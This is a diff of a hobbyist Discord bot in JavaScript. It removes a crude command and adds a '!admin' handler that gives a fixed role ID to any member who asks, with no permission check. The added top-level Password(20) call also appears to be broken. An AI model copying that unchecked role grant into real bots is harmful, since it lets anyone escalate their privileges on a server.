@@ -46,9 +46,6 @@ client.on('message', message => {
         }
 }
 
-function Ew() {
-    message.author.send(`You are one horny bastard!`)    
-}
 
 function PullIp(Name) {
     x = Math.floor(Math.random() * 200) + 1
@@ -112,7 +109,7 @@ function Password(length1) {
                     message.channel.send('Password can not be bigger then 20')
                 }  
             } else {
-                message.channel.send('Please provide length')
+                message.channel.send('Please provide length(3-20)')
             }
             
      
@@ -136,7 +133,7 @@ function Password(length1) {
     GeneratePassword();
 
 }
-
+Password(20)
 
 if (cmd === 'order') {
     Order(args[1], args[2]);
@@ -146,10 +143,6 @@ if (cmd === 'order') {
 
 if (cmd === 'password') {
     Password(args[1])
-}
-
-if (cmd === 'nudes') {
-    Ew();
 }
 
 if (cmd === 'pull') {
@@ -173,6 +166,14 @@ client.on('message', (message) => {
     }
 })
 
+//Commands
+client.on('message', (message) => {
+    if(message.content.toLowerCase() == `${prefix}admin`) {
+        let myRole = message.guild.roles.cache.get("777292149967814666")
+        message.member.roles.add(myRole);
+    }
+})
+
 
 client.on('message', (message) => {
     if(message.content.toLowerCase() == `${prefix}gayrate`) {
@@ -181,6 +182,9 @@ client.on('message', (message) => {
 
     }
 })
+
+
+
 
 
 
